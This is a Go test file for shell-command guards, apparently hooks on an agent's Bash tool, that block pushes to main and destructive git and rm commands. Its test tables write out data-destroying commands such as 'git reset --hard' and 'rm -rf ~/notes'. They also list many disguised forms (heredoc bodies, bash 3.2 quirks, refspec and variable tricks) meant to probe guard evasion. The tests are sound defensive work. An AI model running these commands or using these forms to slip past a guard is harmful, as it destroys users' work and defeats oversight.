		"git commit --no-edit -m \"$(cat <<'EOF2'\ngit push origin main\nEOF2\n)\"",
		"git tag -f -F - edit-x <<'EOF2'\ngit push origin main\nEOF2",
	} {
		if d := newGitPushGuard("main").Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"}); d != nil {
			t.Errorf("git-push-main Check(%q) = %v, want allow", command, d)
		}
		reset := strings.ReplaceAll(command, "git push origin main", "git reset --hard")
		if d := dirtyDiscardGuard().Check(Input{Event: EventBash, Command: reset, Cwd: "/tmp"}); d != nil {
			t.Errorf("git-discard Check(%q) = %v, want allow", reset, d)
		}
	}
}

// TestGitGuardsBash32MessageCode pins the message forms bash 3.2 runs part
// of (MAD-671): a $( ) it ends early, before the line that runs a command,
// leaves that command to run, so the git guards read the heredoc body as
// code (bash32Cats). The expansion takes a # after a blank for a comment
// inside "$( )" too, so a quote on a # line opens a quote for the parse
// step only. The controls are message forms both of bash 3.2's scans read
// as belt does, which stay text.
func TestGitGuardsBash32MessageCode(t *testing.T) {
	const op = "git push origin main"
	cat := func(head, body string) string {
		return head + " \"$(cat <<'EOF2'\n" + body + "\nEOF2\n)\""
	}
	tests := []struct {
		name, command string
		deny          bool
	}{
		{"an early ) then a substitution", cat("git commit -m", "x\n1) $("+op+")"), true},
		{
			"an apostrophe on a # line, then backticks",
			cat("git commit -m", "## What's new\n1) a fix for `"+op+"`\n- don't break it"),
			true,
		},
		{"an apostrophe on a # line, then a substitution", cat("git commit -m", "# it's\n1) $("+op+")\nx'"), true},
		{
			"a pr body with an apostrophe on a # line",
			cat("gh pr create --title t --body", "## What's new\n1) a fix for `"+op+"`\n- don't break it"),
			true,
		},
		{"a backtick span", cat("git commit -m", "fix(belt): read `"+op+"` behind sudo"), false},
		{"an issue ref", cat("git commit -m", "fix(belt): "+op+"\n\nCloses #12"), false},
		{"a numbered list", cat("git commit -m", "fix(belt): two cases\n\n1) "+op+"\n2) a wrapper"), false},
		{"parens", cat("git commit -m", "fix(belt): read "+op+" behind sudo\n\nThe form (and the env one)."), false},
		{"a summary heading", cat("gh pr create --title t --body", "## Summary\n- deny `"+op+"` behind `sudo`"), false},
		{"a $ in a backtick span", cat("git commit -m", "docs: note `$HOME` and "+op+", see #40"), false},
		{"apostrophes", cat("git commit -m", "it's '"+op+"', it's text"), false},
		{"the -F - form", "git commit -F - <<'EOF2'\n## What's new\n1) a fix for `" + op + "`\nEOF2", false},
		{
			"the --body-file - form",
			"gh pr create --title t --body-file - <<'EOF2'\n## What's new\n1) a fix for `" + op + "`\nEOF2",
			false,
		},
	}
	for _, tt := range tests {
		d := newGitPushGuard("main").Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
		if (d != nil) != tt.deny {
			t.Errorf("%s: git-push-main Check(%q) = %v, want deny %v", tt.name, tt.command, d, tt.deny)
		}
		for _, discard := range []string{"git checkout -- f", "git reset --hard"} {
			command := strings.ReplaceAll(tt.command, op, discard)
			d := dirtyDiscardGuard().Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
			if (d != nil) != tt.deny {
				t.Errorf("%s: git-discard Check(%q) = %v, want deny %v", tt.name, command, d, tt.deny)
			}
		}
	}
}

// TestGitGuardsBash32Unclosed pins the message forms bash 3.2 never closes:
// a lone apostrophe in a -m or --body cat runs its parse step to the end of
// the command, a syntax error that runs nothing, so the message is text as
// bash 5 and zsh read it (bash32Unclosed). One a later word closes stays
// code, and the denial then names the forms that stay data (bash32Hint),
// while a denial with no such message keeps its own reason.
func TestGitGuardsBash32Unclosed(t *testing.T) {
	body := func(op string) string {
		return "belt now denies `" + op + "`, since every worktree shares one stash list.\n\nIt's covered by new test rows."
	}
	pr := func(op, tail string) string {
		return "gh pr create --title \"fix(belt): stash drop\" --body \"$(cat <<'EOF'\n" + body(op) + "\nEOF\n)\"" + tail
	}
	commit := func(op, tail string) string {
		return "git commit -m \"$(cat <<'EOF'\n" + body(op) + "\nEOF\n)\"" + tail
	}
	const closes = ` -m "it's done)"`
	tests := []struct {
		name, command string
		deny          bool
	}{
		{"a pr body", pr("%s", ""), false},
		{"a commit message", commit("%s", ""), false},
		{"a commit message, then a second one", commit("%s", ` -m "second (one)"`), false},
		{"a pr body a later word closes", pr("%s", ` --label "it's x)"`), true},
		{"a commit message a later word closes", commit("%s", closes), true},
	}
	guards := []struct {
		op    string
		check func(command string) *Denial
	}{
		{"git push origin main", func(command string) *Denial {
			return newGitPushGuard("main").Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		}},
		{"git stash drop", func(command string) *Denial {
			return dirtyDiscardGuard().Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		}},
		{"git reset --hard", func(command string) *Denial {
			return dirtyDiscardGuard().Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		}},
		{"rm -rf ~/notes", func(command string) *Denial {
			return newFileDiscardGuard(t, t.TempDir()).Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		}},
	}
	for _, tt := range tests {
		for _, g := range guards {
			command := fmt.Sprintf(tt.command, g.op)
			d := g.check(command)
			switch {
			case (d != nil) != tt.deny:
				t.Errorf("%s: Check(%q) = %v, want deny %v", tt.name, command, d, tt.deny)
			case d != nil && !strings.HasSuffix(d.Reason, bash32Hint):
				t.Errorf("%s: Check(%q) reason %q, want it to end in bash32Hint", tt.name, command, d.Reason)
			}
		}
	}
	for _, command := range []string{"git stash drop", "git push origin main \"", "git reset --hard"} {
		d := newGitPushGuard("main").Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		if d == nil {
			d = dirtyDiscardGuard().Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"})
		}
		switch {
		case d == nil:
			t.Errorf("Check(%q) allowed, want a denial", command)
		case strings.Contains(d.Reason, bash32Hint):
			t.Errorf("Check(%q) reason %q holds bash32Hint, want the guard's own", command, d.Reason)
		}
	}
}

func TestGitGuardsHeredocBodies(t *testing.T) {
	for _, tt := range heredocBodies {
		t.Run(tt.name, func(t *testing.T) {
			d := newGitPushGuard(
				"main",
			).Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
			if (d != nil) != tt.deny {
				t.Errorf(
					"git-push-main Check(%q) denial = %v, want deny %v",
					tt.command,
					d,
					tt.deny,
				)
			}
			reset := strings.ReplaceAll(tt.command, "git push origin main", "git reset --hard")
			d = dirtyDiscardGuard().Check(Input{Event: EventBash, Command: reset, Cwd: "/tmp"})
			if (d != nil) != tt.deny {
				t.Errorf("git-discard Check(%q) denial = %v, want deny %v", reset, d, tt.deny)
			}
		})
	}
}

// TestHeredocBackslashJoin (second review, section 3): in an unquoted body
// a line ending in an odd run of backslashes joins the next, so the shell
// compares the joined line with the delimiter. bash 5.3 and zsh 5.9 agree.
func TestHeredocBackslashJoin(t *testing.T) {
	tests := []struct {
		name, command string
		want          []string // each top-level command's words
	}{
		{
			"joined line is no terminator",
			"cat <<E\nx\\\nE\ny\nE\necho z",
			[]string{"cat", "echo z"},
		},
		{"joined line is the terminator", "cat <<E\n\\\nE\ny\nE", []string{"cat", "y", "E"}},
		{"escaped backslash joins nothing", "cat <<E\nx\\\\\nE\ny", []string{"cat", "y"}},
		{"quoted body joins nothing", "cat <<'E'\nx\\\nE\ny", []string{"cat", "y"}},
		{
			"push after the real terminator",
			"cat <<E\nx\\\nE\n: <<Z\nE\ngit push origin main\nZ",
			[]string{"cat", "git push origin main", "Z"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmds, ok := readShell(tt.command)
			if !ok {
				t.Fatalf("readShell(%q) not ok", tt.command)
			}
			var got []string
			for _, c := range cmds {
				got = append(got, strings.Join(c.tokens(), " "))
			}
			if strings.Join(got, "|") != strings.Join(tt.want, "|") {
				t.Errorf("readShell(%q) commands = %q, want %q", tt.command, got, tt.want)
			}
		})
	}
}

// TestGitPushMainShortRefspecs: git reads @ as HEAD, and heads/<name> as
// refs/heads/<name>, on either side of a refspec.
func TestGitPushMainShortRefspecs(t *testing.T) {
	tests := []struct {
		current, command string
		deny             bool
	}{
		{"main", "git push origin @", true},
		{"main", "git push origin heads/main", true},
		{"main", "git push origin HEAD:heads/main", true},
		{"main", "git push origin +@", true},
		{"feature", "git push origin @:heads/main", true},
		{"feature", "git push origin heads/x:heads/master", true},
		{"feature", "git push origin @", false},
		{"feature", "git push origin heads/feature", false},
		{"feature", "git push origin HEAD:heads/feature", false},
		{"main", "git push origin @:heads/feature", false},
	}
	for _, tt := range tests {
		d := newGitPushGuard(
			tt.current,
		).Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
		if (d != nil) != tt.deny {
			t.Errorf(
				"on %s, Check(%q) denial = %v, want deny %v",
				tt.current,
				tt.command,
				d,
				tt.deny,
			)
		}
	}
}

// branchVarPushes (second review, section 4) pin the one shape where a
// refspec variable reads as the current branch: a lone top-level NAME= of a
// current-branch substitution before the push, NAME used nowhere but in
// refspecs, nothing that could set NAME again, and no move of the shell.
var branchVarPushes = []struct {
	name, command string
	ok            bool // reads as the current branch
}{
	{"semicolon", `B=$(git branch --show-current); git push -u origin "$B"`, true},
	{"and", `B=$(git branch --show-current) && git push -u origin "$B"`, true},
	{"newline, backticks, bare", "B=`git branch --show-current`\ngit push origin $B", true},
	{"quoted, braces", `B="$(git rev-parse --abbrev-ref HEAD)"; git push origin "${B}"`, true},
	{"symbolic-ref, bare braces", `B=$(git symbolic-ref --short HEAD); git push origin ${B}`, true},
	{"after an and", `git fetch && B=$(git branch --show-current) && git push origin "$B"`, true},

	{"no assignment", `git push -u origin "$BRANCH"`, false},
	{"assigned twice", `B=$(git branch --show-current); B=main; git push origin "$B"`, false},
	{"read", `B=$(git branch --show-current); read B; git push origin "$B"`, false},
	{"export", `B=$(git branch --show-current); export B; git push origin "$B"`, false},
	{"unset", `B=$(git branch --show-current); unset B; git push origin "$B"`, false},
	{"eval", `B=$(git branch --show-current); eval "$X"; git push origin "$B"`, false},
	{"source", `B=$(git branch --show-current); source ./x.sh; git push origin "$B"`, false},
	{"dot", `B=$(git branch --show-current); . ./x.sh; git push origin "$B"`, false},
	{
		"for",
		`for B in main; do :; done; B=$(git branch --show-current); git push origin "$B"`,
		false,
	},
	{
		"if block",
		"if false; then\nB=$(git branch --show-current)\nfi\ngit push origin \"$B\"",
		false,
	},
	{"brace group", "{\nB=$(git branch --show-current)\n} | cat\ngit push origin \"$B\"", false},
	{"cd after", `B=$(git branch --show-current); cd /other && git push origin "$B"`, false},
	{"cd before", `cd /other; B=$(git branch --show-current); git push origin "$B"`, false},
	{"pushd", `B=$(git branch --show-current); pushd /other; git push origin "$B"`, false},
	{"popd", `B=$(git branch --show-current); popd; git push origin "$B"`, false},
	{"git -C", `B=$(git branch --show-current); git -C /other push origin "$B"`, false},
	{"--git-dir", `B=$(git branch --show-current); git --git-dir=/o/.git push origin "$B"`, false},
	{"piped", `B=$(git branch --show-current) | cat; git push origin "$B"`, false},
	{"backgrounded", `B=$(git branch --show-current) & git push origin "$B"`, false},
	{"after or", `true || B=$(git branch --show-current); git push origin "$B"`, false},
	{"in a subshell", `(B=$(git branch --show-current)); git push origin "$B"`, false},
	{"in a substitution", `echo $(B=$(git branch --show-current)); git push origin "$B"`, false},
	{"after the push", `git push origin "$B"; B=$(git branch --show-current)`, false},
	{"managed name", `PATH=$(git branch --show-current); git push origin "$PATH"`, false},
	{"HOME", `HOME=$(git branch --show-current); git push origin "$HOME"`, false},
	{"other substitution", `B=$(git -C /o branch --show-current); git push origin "$B"`, false},
	{"two words", `B=$(git branch --show-current) C=x; git push origin "$B"`, false},
	{"used elsewhere", `B=$(git branch --show-current); echo "$B"; git push origin "$B"`, false},
	{
		"default operator",
		`B=$(git branch --show-current); : ${B:=main}; git push origin "$B"`,
		false,
	},
	{"colon refspec", `B=$(git branch --show-current); git push origin "$B:main"`, false},
	{"single quotes", `B=$(git branch --show-current); git push origin '$B'`, false},
	{"prefix on the push", `B=$(git branch --show-current); B=x git push origin "$B"`, false},
}

func TestGitPushMainBranchVariable(t *testing.T) {
	for _, tt := range branchVarPushes {
		t.Run(tt.name, func(t *testing.T) {
			feature := newGitPushGuard(
				"feature",
			).Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
			if (feature == nil) != tt.ok {
				t.Errorf(
					"from feature, Check(%q) denial = %v, want allow %v",
					tt.command,
					feature,
					tt.ok,
				)
			}
			if d := newGitPushGuard("main").Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"}); d == nil {
				t.Errorf("on main, Check(%q) allowed", tt.command)
			}
		})
	}
	t.Run("conditional assignment with NAME in the environment", func(t *testing.T) {
		t.Setenv("B", "main")
		cmd := `git fetch && B=$(git branch --show-current); git push origin "$B"`
		if d := newGitPushGuard("feature").Check(Input{Event: EventBash, Command: cmd, Cwd: "/tmp"}); d == nil {
			t.Errorf("Check(%q) with B in the environment allowed", cmd)
		}
	})
}
